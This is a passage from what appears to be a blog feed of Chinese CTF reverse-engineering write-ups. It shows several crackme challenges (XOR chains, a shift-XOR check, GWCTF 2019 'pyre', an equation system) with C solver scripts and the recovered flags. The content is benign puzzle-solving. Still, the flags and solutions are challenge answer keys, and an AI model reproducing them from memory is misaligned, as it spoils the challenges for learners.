&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个就是输入flag，flag[2]=flag[1]^60,flag[3]=glag[2]^23,以此类推。<br>众所周知，大部分flag都是有意义的一串字符，这里我采用了穷举。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> i,j;</span><br><span class="line"><span class="keyword">int</span> s[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">15</span>]=&#123;<span class="number">60</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">41</span>, <span class="number">110</span>, <span class="number">66</span>, <span class="number">44</span>, <span class="number">17</span>, <span class="number">126</span>, <span class="number">68</span>, <span class="number">43</span>, <span class="number">26</span>, <span class="number">113</span>, <span class="number">71</span>, <span class="number">10</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">32</span>;i&lt;<span class="number">127</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">s[<span class="number">0</span>]=i;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">15</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line">s[j+<span class="number">1</span>]=f[j]^s[j];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">16</span>;j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,s[j]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Jvav_1s_N0t_E4sy}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python逆向</title>
      <link href="/2021/03/03/python%E9%80%86%E5%90%91/"/>
      <url>/2021/03/03/python%E9%80%86%E5%90%91/</url>
      
        <content type="html"><![CDATA[<h1 id="test"><a href="#test" class="headerlink" title="test"></a>test</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1DGgkAlcAH1QP1LROT60Ipg">附件链接</a> 提取码：0000</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line">ans = <span class="number">0x6675FA7F228DBCEB6A2DC223A37FC64FE67E61L</span></span><br><span class="line">flag = s2n(<span class="built_in">input</span>(<span class="string">&#x27;Input your flag: &#x27;</span>))</span><br><span class="line">flag ^= flag &gt;&gt; <span class="number">10</span></span><br><span class="line"><span class="keyword">if</span> flag == ans:</span><br><span class="line">    print(<span class="string">&#x27;You are right!&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">&#x27;Try again!&#x27;</span>)</span><br></pre></td></tr></table></figure><p>flag的前十位与ans的前十位相同，flag的11-20位是flag1-10位与ans的11-20位异或的结果，以下为脚本。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans[<span class="number">151</span>]=&#123;<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,</span><br><span class="line"><span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">151</span>];</span><br><span class="line"><span class="keyword">int</span> i,k,j=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]=ans[i];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(k=<span class="number">0</span>;k&lt;<span class="number">14</span>;k++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span>(i=j;i&lt;j+<span class="number">10</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i]=ans[i]^flag[i<span class="number">-10</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,flag[i]);</span><br><span class="line">&#125;</span><br><span class="line">j=j+<span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line">flag[<span class="number">151</span>]=flag[<span class="number">141</span>]^ans[<span class="number">151</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,flag[<span class="number">151</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果为2进制，转16进制再转字符串。</p><blockquote><p>flag{Sh1ft_4nd_X0r}</p></blockquote><h1 id="pyre"><a href="#pyre" class="headerlink" title="pyre"></a>pyre</h1><p><a href="https://buuoj.cn/challenges#[GWCTF%202019]pyre">题目链接</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br></pre></td></tr></table></figure><p>第五行其实就是num=input1[i]+i,超过127，就减去128.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j;</span><br><span class="line">    <span class="keyword">int</span> code[<span class="number">23</span>]=&#123;<span class="number">0x1f</span>,<span class="number">0x12</span>,<span class="number">0x1d</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;4&#x27;</span>,<span class="number">0x01</span>,<span class="number">0x06</span>,<span class="number">0x14</span>,<span class="string">&#x27;4&#x27;</span>,<span class="string">&#x27;,&#x27;</span>,<span class="number">0x1b</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,<span class="string">&#x27;?&#x27;</span>,<span class="string">&#x27;o&#x27;</span>,<span class="string">&#x27;6&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="number">0x01</span>,<span class="string">&#x27;D&#x27;</span>,<span class="string">&#x27;;&#x27;</span>,<span class="string">&#x27;%&#x27;</span>,<span class="number">0x13</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">21</span>;i&gt;=<span class="number">0</span>;i--)</span><br><span class="line">    &#123;</span><br><span class="line">    code[i]=code[i]^code[i + <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">23</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">code[i]-=i;</span><br><span class="line"><span class="keyword">if</span>(code[i]&lt;<span class="number">0</span>)</span><br><span class="line">    code[i]+=<span class="number">128</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,code[i]);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>flag{Just_Re_1s_Ha66y!}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>某不知名网站题目</title>
      <link href="/2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/"/>
      <url>/2021/03/02/%E6%9F%90%E4%B8%8D%E7%9F%A5%E5%90%8D%E7%BD%91%E7%AB%99%E9%A2%98%E7%9B%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="equations"><a href="#equations" class="headerlink" title="equations"></a>equations</h1><a id="more"></a><p><a href="https://pan.baidu.com/s/1NK0Gtr3oqlk2Jn2mgasROQ">附件链接</a> 提取码：0000<br>题目翻译城中文为方程组<br>放入ida64中</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">234923  89 30 21 11 28 97 68 91 36 29 54 38 18 31 27 25 42 93 45 89 80 94 57 68 59 75 74 </span><br><span class="line">47 40 25 68 52 86 81 38 23 90 80 54 66 80 36</span><br><span class="line">233479  65 11 81 65 58 53 86 44 62 39 64 41 93 67 34 30 25 45 76 17 91 47 57 82 26 17 94 </span><br><span class="line">51 21 80 59 26 75 75 25 67 52 23 81 57 79 98</span><br><span class="line">231388  63 83 55 29 57 53 31 99 27 92 85 98 63 80 18 78 79 28 96 16 95 27 25 71 40 89 79 </span><br><span class="line">81 13 85 41 44 50 55 11 32 76 65 20 37 58 27</span><br><span class="line">223405  39 69 44 25 49 15 16 96 35 32 92 95 11 58 31 90 67 72 83 78 15 25 93 96 97 31 58 </span><br><span class="line">59 14 86 36 37 22 75 43 72 13 26 18 64 64 83</span><br><span class="line">234762  94 82 88 51 31 71 44 74 26 46 95 66 54 75 19 72 93 16 85 54 46 87 15 46 74 27 26 </span><br><span class="line">48 83 13 38 94 45 52 24 72 59 71 32 65 24 93</span><br><span class="line">242484  34 75 68 93 79 19 14 76 60 69 73 29 48 61 49 64 98 29 77 81 85 11 87 11 72 63 87 </span><br><span class="line">40 47 48 87 54 88 27 26 67 93 50 79 42 12 32</span><br><span class="line">232356  76 61 21 72 11 93 13 63 15 13 73 49 48 76 52 81 62 78 84 79 95 74 57 21 13 95 15 </span><br><span class="line">93 57 38 89 98 68 69 21 40 20 55 62 29 54 40</span><br><span class="line">239858  98 66 92 23 97 55 72 69 81 41 38 21 56 95 86 39 78 53 65 37 80 56 38 60 94 72 20 </span><br><span class="line">43 50 28 81 63 12 60 32 12 22 86 65 32 76 71</span><br><span class="line">218896  32 15 73 84 27 21 74 21 35 26 85 28 57 91 37 12 67 47 10 74 62 53 73 84 94 46 74 </span><br><span class="line">47 57 40 88 71 13 32 81 95 57 28 13 94 45 34</span><br><span class="line">249026  50 47 34 57 12 34 76 54 79 18 44 73 50 92 51 72 39 91 26 74 97 42 86 79 53 50 62 </span><br><span class="line">14 71 55 87 64 77 62 63 48 27 81 93 85 65 83</span><br><span class="line">222855  92 26 78 74 25 38 64 98 68 71 14 99 92 11 31 29 20 52 17 10 21 37 99 52 66 32 57 </span><br><span class="line">58 25 25 93 54 96 70 18 66 84 27 44 28 52 83</span><br><span class="line">210754  53 39 23 68 62 44 98 17 80 16 63 51 15 49 84 23 97 26 65 35 11 83 43 64 21 39 37 </span><br><span class="line">79 73 61 55 57 58 69 16 10 48 86 80 13 67 32</span><br><span class="line">261049  12 69 82 77 95 22 21 85 79 58 48 83 47 77 64 80 56 35 78 67 46 93 51 75 69 62 44 </span><br><span class="line">11 46 98 37 93 34 53 87 46 85 79 69 81 45 86</span><br><span class="line">254017  51 74 62 62 86 10 49 94 65 50 62 95 48 66 14 84 61 41 89 78 46 60 20 97 32 65 61 </span><br><span class="line">78 57 16 64 97 81 81 76 61 27 46 99 64 35 99</span><br><span class="line">202040  15 47 16 70 28 32 65 82 53 32 29 25 69 96 52 76 22 41 82 91 47 24 55 40 18 19 52 </span><br><span class="line">83 37 51 89 37 27 55 40 82 61 27 26 28 30 73</span><br><span class="line">213614  11 29 51 69 81 96 58 97 36 81 18 62 73 32 72 11 49 61 69 67 54 30 10 70 42 27 19 </span><br><span class="line">11 97 83 27 40 63 12 41 21 84 74 22 19 65 79</span><br><span class="line">246738  76 64 47 17 80 57 93 11 79 98 56 86 23 67 63 11 54 72 80 44 50 61 14 43 80 48 63 </span><br><span class="line">52 99 79 40 64 49 55 52 78 48 60 44 32 85 98</span><br><span class="line">204859  77 34 26 66 87 76 58 39 81 60 83 23 16 62 33 36 85 40 64 78 22 11 81 81 27 12 11 </span><br><span class="line">41 15 19 69 20 26 66 17 87 50 67 47 21 31 81</span><br><span class="line">248644  56 66 51 80 33 73 76 42 13 91 75 90 82 20 15 99 33 18 22 28 39 17 74 54 78 47 61 </span><br><span class="line">68 73 95 60 52 84 11 78 67 82 79 31 94 78 74</span><br><span class="line">227559  24 15 63 20 81 71 50 77 98 71 98 43 57 10 66 53 36 45 44 54 90 22 96 68 98 27 71 </span><br><span class="line">78 37 43 20 50 82 84 19 76 59 27 47 31 19 31</span><br><span class="line">215120  45 66 23 77 41 65 99 35 67 29 63 77 55 36 27 63 43 70 55 11 28 17 77 90 28 57 62 </span><br><span class="line">98 84 96 36 43 30 73 32 25 34 14 91 18 73 26</span><br><span class="line">218244  65 25 41 22 34 46 91 70 35 22 65 60 96 58 76 80 21 62 59 70 51 50 39 14 31 39 79 </span><br><span class="line">49 45 82 74 35 56 24 93 47 32 41 14 15 71 51</span><br><span class="line">229321  45 99 29 14 89 72 48 43 92 10 94 13 33 94 59 22 65 29 23 86 67 83 28 46 83 89 48 </span><br><span class="line">59 28 38 82 32 70 50 28 39 24 60 17 37 60 90</span><br><span class="line">233372  62 66 17 38 19 83 12 98 61 57 63 67 69 10 24 75 60 87 76 37 91 35 20 30 24 77 29 </span><br><span class="line">27 40 36 98 82 20 67 45 96 99 80 17 55 74 55</span><br><span class="line">251643  64 68 36 79 23 96 16 40 79 16 85 77 99 56 95 99 60 28 11 96 22 66 47 66 90 48 80 </span><br><span class="line">34 22 47 66 80 37 43 75 84 23 21 39 85 64 95</span><br><span class="line">245051  14 55 61 90 62 91 24 31 40 34 88 59 65 26 16 28 36 33 81 91 99 57 69 75 32 98 17 </span><br><span class="line">60 94 16 89 51 35 74 87 98 52 39 73 41 65 65</span><br><span class="line">228339  58 64 96 49 96 43 13 28 42 90 80 33 68 62 42 78 75 56 20 66 45 63 10 72 41 63 28 </span><br><span class="line">42 60 26 76 20 98 19 51 68 80 12 48 68 80 15</span><br><span class="line">271672  93 74 76 39 79 99 22 66 47 40 85 58 50 56 84 93 65 65 56 66 95 32 84 48 51 68 30 </span><br><span class="line">96 93 60 83 79 54 61 99 77 12 51 31 93 54 12</span><br><span class="line">207826  30 29 52 29 91 81 31 28 75 84 10 40 14 34 26 70 94 74 27 38 55 13 21 55 79 94 45 </span><br><span class="line">41 39 62 56 25 10 54 61 58 23 97 95 70 18 62</span><br><span class="line">208076  19 60 27 79 53 21 21 47 52 26 42 82 20 87 74 57 88 22 67 95 69 24 50 14 31 26 38 </span><br><span class="line">40 31 46 17 67 85 54 33 46 43 72 84 94 67 29</span><br><span class="line">230168  37 52 47 30 99 11 20 20 41 72 46 78 97 93 47 73 48 35 85 99 77 49 48 75 94 44 29 </span><br><span class="line">11 18 71 82 88 27 70 95 26 19 73 61 51 55 51</span><br><span class="line">195444  92 21 36 77 36 27 25 45 48 16 73 90 71 53 47 39 75 33 96 11 22 18 15 48 20 16 90 </span><br><span class="line">50 66 11 49 91 23 60 81 53 57 18 19 40 54 48</span><br><span class="line">233025  47 22 61 36 88 58 42 13 69 33 89 93 93 75 31 98 65 94 77 16 14 99 21 89 90 37 27 </span><br><span class="line">11 22 80 66 65 31 70 76 29 49 92 51 38 27 47</span><br><span class="line">224202  69 33 97 97 51 59 15 17 92 59 84 19 33 54 78 15 50 28 40 68 75 23 55 38 69 46 21 </span><br><span class="line">39 36 74 84 90 31 57 81 21 46 66 63 23 43 82</span><br><span class="line">246170  26 52 48 41 14 64 11 31 90 49 93 92 45 56 99 85 81 26 34 27 55 55 85 26 41 83 41 </span><br><span class="line">46 89 41 66 96 92 16 47 73 59 85 57 88 70 49</span><br><span class="line">223337  26 74 51 31 10 55 23 33 62 97 93 71 96 89 28 35 63 26 66 12 83 67 39 72 92 78 70 </span><br><span class="line">19 63 76 74 70 84 31 18 22 54 74 32 30 65 15</span><br><span class="line">244180  88 20 28 71 54 74 73 90 12 35 49 94 69 20 18 88 80 88 73 65 19 40 23 17 21 48 71 </span><br><span class="line">89 96 61 92 81 74 36 78 16 81 39 43 12 80 91</span><br><span class="line">241027  30 64 16 36 85 58 43 97 90 85 79 28 28 86 24 40 43 22 95 74 73 29 35 13 82 67 77 </span><br><span class="line">76 19 70 29 61 92 51 82 98 40 83 72 33 81 41</span><br><span class="line">225646  55 16 69 49 35 88 71 14 64 16 23 34 81 89 66 79 20 40 11 10 52 74 55 26 64 30 97 </span><br><span class="line">65 51 88 55 59 20 18 97 86 65 28 44 71 64 93</span><br><span class="line">217174  48 91 36 87 35 11 40 67 90 25 39 85 29 97 57 44 99 88 34 83 75 10 73 63 44 63 56 </span><br><span class="line">17 94 16 28 78 55 63 19 22 37 36 42 16 49 51</span><br><span class="line">222271  51 55 27 49 54 89 77 58 15 36 25 43 71 57 78 55 54 58 28 79 87 92 39 88 61 11 27 </span><br><span class="line">66 59 96 79 75 69 25 16 40 68 30 16 12 51 48</span><br><span class="line">203973  71 29 57 59 30 75 67 39 95 14 48 49 35 93 56 94 14 59 12 49 19 40 16 86 79 38 31 </span><br><span class="line">43 82 14 51 85 85 19 99 35 30 19 26 15 32 77</span><br></pre></td></tr></table></figure><p>最终结果转换成字符串即可。</p><blockquote><p>flag{nO_w@y_y0u_woRk_ou7_mY_equ4tions_5et}</p></blockquote><h1 id="re-1"><a href="#re-1" class="headerlink" title="re_1"></a>re_1</h1><p><a href="https://pan.baidu.com/s/1VidIkvouV3V1GUSc79yMFQ">附件链接</a> 提取码：0000<br>ida64打开，进入main函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span 